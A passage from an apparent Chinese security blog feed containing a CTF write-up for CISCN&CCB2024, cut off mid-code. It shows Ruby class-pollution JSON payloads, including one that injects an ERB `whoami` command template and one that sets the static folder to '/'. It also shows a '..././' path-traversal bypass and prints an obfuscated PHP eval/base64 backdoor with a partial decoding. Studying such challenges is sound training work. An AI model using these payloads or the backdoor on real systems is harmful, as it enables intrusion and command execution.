src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps24.jpg" alt="img"></p><p>gcc命令中用 <code>-l</code> 链接 ssl 库和 crypto 库</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;期末自查用&lt;/p&gt;</summary>
    
    
    
    <category term="Basic" scheme="http://c1oudfl0w0.github.io/blog/categories/Basic/"/>
    
    
  </entry>
  
  <entry>
    <title>CISCN&amp;CCB2024</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/15/CISCN-CCB2024/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/15/CISCN-CCB2024/</id>
    <published>2024-12-15T01:15:16.000Z</published>
    <updated>2024-12-23T18:31:25.898Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一觉醒来NISA实力下降一万倍，哈哈两人退役之后我们完蛋了</p><p>这b web真是一天比一天难打了，梭哈半天拿不下少解题，其他题回头就被打烂</p><p>学web救不了NISA，唉我好菜啊😭</p><p>参考：</p><p><a href="https://xz.aliyun.com/t/16750">https://xz.aliyun.com/t/16750</a></p><p><a href="https://xz.aliyun.com/t/16792">https://xz.aliyun.com/t/16792</a></p><span id="more"></span><p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215231840744.png" alt="image-20241215231840744"></p><hr><h1 id="ezruby（Unsolved）"><a href="#ezruby（Unsolved）" class="headerlink" title="ezruby（Unsolved）"></a>ezruby（Unsolved）</h1><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># frozen_string_literal: true</span><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'json'</span></span><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'sinatra/base'</span></span><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'net/http'</span></span><span class="token keyword">class</span> <span class="token class-name">Person</span>  <span class="token variable">@@url</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"http://default-url.com"</span></span>  attr_accessor <span class="token symbol">:name</span><span class="token punctuation">,</span> <span class="token symbol">:age</span><span class="token punctuation">,</span> <span class="token symbol">:details</span>  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span><span class="token symbol">name</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">age</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">details</span><span class="token operator">:</span><span class="token punctuation">)</span>    <span class="token variable">@name</span> <span class="token operator">=</span> name    <span class="token variable">@age</span> <span class="token operator">=</span> age    <span class="token variable">@details</span> <span class="token operator">=</span> details  <span class="token keyword">end</span>  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">url</span></span>    <span class="token variable">@@url</span>  <span class="token keyword">end</span>  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">merge_with</span></span><span class="token punctuation">(</span>additional<span class="token punctuation">)</span>    recursive_merge<span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">,</span> additional<span class="token punctuation">)</span>  <span class="token keyword">end</span>  <span class="token keyword">private</span>  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">recursive_merge</span></span><span class="token punctuation">(</span>original<span class="token punctuation">,</span> additional<span class="token punctuation">,</span> current_obj <span class="token operator">=</span> original<span class="token punctuation">)</span>    additional<span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token keyword">do</span> <span class="token operator">|</span>key<span class="token punctuation">,</span> value<span class="token operator">|</span>      <span class="token keyword">if</span> value<span class="token punctuation">.</span>is_a<span class="token operator">?</span><span class="token punctuation">(</span><span class="token builtin">Hash</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> current_obj<span class="token punctuation">.</span>respond_to<span class="token operator">?</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>          next_obj <span class="token operator">=</span> current_obj<span class="token punctuation">.</span>public_send<span class="token punctuation">(</span>key<span class="token punctuation">)</span>          recursive_merge<span class="token punctuation">(</span>original<span class="token punctuation">,</span> value<span class="token punctuation">,</span> next_obj<span class="token punctuation">)</span>        <span class="token keyword">else</span>          new_object <span class="token operator">=</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">new</span>          current_obj<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">key</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> new_object<span class="token punctuation">)</span>          current_obj<span class="token punctuation">.</span>singleton_class<span class="token punctuation">.</span>attr_accessor key        <span class="token keyword">end</span>      <span class="token keyword">else</span>        <span class="token keyword">if</span> current_obj<span class="token punctuation">.</span>is_a<span class="token operator">?</span><span class="token punctuation">(</span><span class="token builtin">Hash</span><span class="token punctuation">)</span>          current_obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value        <span class="token keyword">else</span>          current_obj<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">key</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>          current_obj<span class="token punctuation">.</span>singleton_class<span class="token punctuation">.</span>attr_accessor key        <span class="token keyword">end</span>      <span class="token keyword">end</span>    <span class="token keyword">end</span>    original  <span class="token keyword">end</span><span class="token keyword">end</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token operator">&lt;</span> Person  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span><span class="token symbol">name</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">age</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">details</span><span class="token operator">:</span><span class="token punctuation">)</span>    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token symbol">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span> <span class="token symbol">age</span><span class="token operator">:</span> age<span class="token punctuation">,</span> <span class="token symbol">details</span><span class="token operator">:</span> details<span class="token punctuation">)</span>  <span class="token keyword">end</span><span class="token keyword">end</span><span class="token keyword">class</span> <span class="token class-name">KeySigner</span>  <span class="token variable">@@signing_key</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"default-signing-key"</span></span>  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">signing_key</span></span>    <span class="token variable">@@signing_key</span>  <span class="token keyword">end</span>  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">sign</span></span><span class="token punctuation">(</span>signing_key<span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">data</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">-signed-with-</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">signing_key</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>  <span class="token keyword">end</span><span class="token keyword">end</span><span class="token keyword">class</span> <span class="token class-name">JSONMergerApp</span> <span class="token operator">&lt;</span> Sinatra<span class="token double-colon punctuation">::</span>Base  set  <span class="token symbol">:bind</span> <span class="token punctuation">,</span>  <span class="token string-literal"><span class="token string">'0.0.0.0'</span></span>  set  <span class="token symbol">:port</span> <span class="token punctuation">,</span>  <span class="token string-literal"><span class="token string">'8888'</span></span>  post <span class="token string-literal"><span class="token string">'/merge'</span></span> <span class="token keyword">do</span>    content_type <span class="token symbol">:json</span>    j_str <span class="token operator">=</span> request<span class="token punctuation">.</span>body<span class="token punctuation">.</span>read    <span class="token keyword">return</span> <span class="token string-literal"><span class="token string">"try try try"</span></span>  <span class="token keyword">if</span> j_str<span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"\\"</span></span><span class="token punctuation">)</span> <span class="token operator">||</span> j_str<span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"h"</span></span><span class="token punctuation">)</span>    json_input <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span>parse<span class="token punctuation">(</span>j_str<span class="token punctuation">,</span> <span class="token symbol">symbolize_names</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">)</span>    user <span class="token operator">=</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>      <span class="token symbol">name</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"John Doe"</span></span><span class="token punctuation">,</span>      <span class="token symbol">age</span><span class="token operator">:</span> <span class="token number">30</span><span class="token punctuation">,</span>      <span class="token symbol">details</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string-literal"><span class="token string">"occupation"</span></span> <span class="token operator">=></span> <span class="token string-literal"><span class="token string">"Engineer"</span></span><span class="token punctuation">,</span>        <span class="token string-literal"><span class="token string">"location"</span></span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>          <span class="token string-literal"><span class="token string">"city"</span></span> <span class="token operator">=></span> <span class="token string-literal"><span class="token string">"Madrid"</span></span><span class="token punctuation">,</span>          <span class="token string-literal"><span class="token string">"country"</span></span> <span class="token operator">=></span> <span class="token string-literal"><span class="token string">"Spain"</span></span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">)</span>    user<span class="token punctuation">.</span>merge_with<span class="token punctuation">(</span>json_input<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'merged'</span></span> <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json  <span class="token keyword">end</span>  <span class="token comment"># GET /launch-curl-command - Activates the first gadget</span>  get <span class="token string-literal"><span class="token string">'/launch-curl-command'</span></span> <span class="token keyword">do</span>    content_type <span class="token symbol">:json</span>    <span class="token comment"># This gadget makes an HTTP request to the URL stored in the User class</span>    <span class="token keyword">if</span> Person<span class="token punctuation">.</span>respond_to<span class="token operator">?</span><span class="token punctuation">(</span><span class="token symbol">:url</span><span class="token punctuation">)</span>      url <span class="token operator">=</span> Person<span class="token punctuation">.</span>url      response <span class="token operator">=</span> Net<span class="token double-colon punctuation">::</span><span class="token constant">HTTP</span><span class="token punctuation">.</span>get_response<span class="token punctuation">(</span><span class="token constant">URI</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HTTP request made'</span></span><span class="token punctuation">,</span> <span class="token symbol">url</span><span class="token operator">:</span> url <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json    <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'Failed to access URL variable'</span></span> <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json    <span class="token keyword">end</span>  <span class="token keyword">end</span>    get <span class="token string-literal"><span class="token string">'/sign_with_subclass_key'</span></span> <span class="token keyword">do</span>    content_type <span class="token symbol">:json</span>        signer <span class="token operator">=</span> <span class="token class-name">KeySigner</span><span class="token punctuation">.</span><span class="token keyword">new</span>    signed_data <span class="token operator">=</span> signer<span class="token punctuation">.</span>sign<span class="token punctuation">(</span>KeySigner<span class="token punctuation">.</span>signing_key<span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"data-to-sign"</span></span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'Data signed'</span></span><span class="token punctuation">,</span> <span class="token symbol">signing_key</span><span class="token operator">:</span> KeySigner<span class="token punctuation">.</span>signing_key<span class="token punctuation">,</span> <span class="token symbol">signed_data</span><span class="token operator">:</span> signed_data <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json  <span class="token keyword">end</span>    get <span class="token string-literal"><span class="token string">'/check-infected-vars'</span></span> <span class="token keyword">do</span>    content_type <span class="token symbol">:json</span>    <span class="token punctuation">&#123;</span>      <span class="token symbol">user_url</span><span class="token operator">:</span> Person<span class="token punctuation">.</span>url<span class="token punctuation">,</span>      <span class="token symbol">signing_key</span><span class="token operator">:</span> KeySigner<span class="token punctuation">.</span>signing_key    <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json  <span class="token keyword">end</span>  get<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'/'</span></span><span class="token punctuation">)</span> <span class="token keyword">do</span>    erb <span class="token symbol">:hello</span>  <span class="token keyword">end</span>  run<span class="token operator">!</span> <span class="token keyword">if</span> app_file <span class="token operator">==</span> $<span class="token number">0</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://github.com/HackTricks-wiki/hacktricks/blob/3e784b40f5711208c50e75daa3a5b1a839cb7316/pentesting-web/deserialization/ruby-class-pollution.md">https://github.com/HackTricks-wiki/hacktricks/blob/3e784b40f5711208c50e75daa3a5b1a839cb7316/pentesting-web/deserialization/ruby-class-pollution.md</a></p><p><a href="https://book.hacktricks.xyz/cn/pentesting-web/deserialization/ruby-class-pollution">https://book.hacktricks.xyz/cn/pentesting-web/deserialization/ruby-class-pollution</a></p><p><a href="https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html">https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html</a></p><p>payload：后者是随机找类覆盖的需要多次尝试</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"class"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"url"</span><span class="token operator">:</span><span class="token string">"Http://malicious.com"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"class"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"subclasses"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"sample"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"signing_key"</span><span class="token operator">:</span><span class="token string">"injected-signing-key"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>开头这个<code># frozen_string_literal: true</code>会冻结所有字符串字面量</p><p>观察一下改动的地方</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">set  <span class="token symbol">:bind</span> <span class="token punctuation">,</span>  <span class="token string-literal"><span class="token string">'0.0.0.0'</span></span>set  <span class="token symbol">:port</span> <span class="token punctuation">,</span>  <span class="token string-literal"><span class="token string">'8888'</span></span>  <span class="token keyword">return</span> <span class="token string-literal"><span class="token string">"try try try"</span></span>  <span class="token keyword">if</span> j_str<span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"\\"</span></span><span class="token punctuation">)</span> <span class="token operator">||</span> j_str<span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"h"</span></span><span class="token punctuation">)</span>  <span class="token keyword">if</span> Person<span class="token punctuation">.</span>respond_to<span class="token operator">?</span><span class="token punctuation">(</span><span class="token symbol">:url</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> Person<span class="token punctuation">.</span>url    response <span class="token operator">=</span> Net<span class="token double-colon punctuation">::</span><span class="token constant">HTTP</span><span class="token punctuation">.</span>get_response<span class="token punctuation">(</span><span class="token constant">URI</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HTTP request made'</span></span><span class="token punctuation">,</span> <span class="token symbol">url</span><span class="token operator">:</span> url <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么就是ban了反斜杠和<code>h</code>，同时 curl 无回显</p><p>可以用<code>H</code>绕过</p><p>然后接下来的思路是在 JSONMergerApp 里找一个能污染的属性来实现类似于静态文件读取或者 getshell</p><p>这里尝试污染hello模板</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"class"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"subclasses"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"sample"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"templates"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"hello"</span><span class="token operator">:</span> <span class="token string">"&lt;%= `whoami` %>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>想起来有waf，绕不过去</p><p>或者设置静态目录</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"class"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"subclasses"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"sample"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"public_folder"</span><span class="token operator">:</span> <span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="helloweb（复现）"><a href="#helloweb（复现）" class="headerlink" title="helloweb（复现）"></a>helloweb（复现）</h1><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/index.php?file=hello.php</span> <span class="token http-version property">HTTP/1.1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span><span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Sun, 15 Dec 2024 02:10:51 GMT</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html; charset=UTF-8</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Vary</span><span class="token punctuation">:</span> <span class="token header-value">Accept-Encoding</span></span><span class="token header"><span class="token header-name keyword">tip</span><span class="token punctuation">:</span> <span class="token header-value">&amp;#105;&amp;#110;&amp;#99;&amp;#108;&amp;#117;&amp;#100;&amp;#101;&amp;#46;&amp;#112;&amp;#104;&amp;#112</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">2470</span></span>&lt;!-- ../hackme.php -->&lt;!--  ../tips.php  -->&lt;div class="relocating">Navigating to: &lt;span class="relocate-location">&lt;/span>...&lt;/div><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>tip解码出来是 include.php，但是访问不到这个文件</p><p>index.php，hello.php，hackme.php，tips.php 均在同一文件夹下，但是上面的 hint 里是<code>../</code>，而我们输入的 ..&#x2F;hackme.php 实际上访问的也是 hackme.php</p><p>结合 Navigating ，猜测替换了<code>../</code>为空，有双写绕过，尝试<code>..././hackme.php</code></p><p>能读到</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$lJbGIY</span><span class="token operator">=</span><span class="token string double-quoted-string">"eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME"</span><span class="token punctuation">;</span><span class="token variable">$OlWYMv</span><span class="token operator">=</span><span class="token string double-quoted-string">"zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel"</span><span class="token punctuation">;</span><span class="token variable">$lapUCm</span><span class="token operator">=</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$YwzIst</span><span class="token operator">=</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">33</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">30</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token variable">$OxirhK</span><span class="token operator">=</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">33</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">24</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">24</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token variable">$YpAUWC</span><span class="token operator">=</span><span class="token variable">$OxirhK</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">18</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$OxirhK</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$OxirhK</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">24</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token variable">$rVkKjU</span><span class="token operator">=</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">13</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token variable">$YwzIst</span><span class="token operator">.=</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">22</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">36</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">29</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">26</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">30</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">32</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">35</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">26</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">30</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$YwzIst</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw=="</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$YwzIst 是 base64_decode，decode后的内容：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$uWcdaA</span><span class="token operator">=</span><span class="token string double-quoted-string">"eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxMEzqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrelmM9jWAfxqnT2UYjLKi9qw1DFYNIhgYRsDhUVBwEXGvE7HM8+Ox=="</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?>'</span><span class="token operator">.</span><span class="token variable">$YwzIst</span><span class="token punctuation">(</span><span class="token variable">$OxirhK</span><span class="token punctuation">(</span><span class="token variable">$YpAUWC</span><span class="token punctuation">(</span><span class="token variable">$uWcdaA</span><span class="token punctuation">,</span><span class="token variable">$rVkKjU</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$YpAUWC</span><span class="token punctuation">(</span><span class="token variable">$uWcdaA</span><span class="token punctuation">,</span><span class="token variable">$rVkKjU</span><span class="token punctuation">,</span><span class="token variable">$rVkKjU</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$YpAUWC</span><span class="token punctuation">(</span><span class="token variable">$uWcdaA</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token 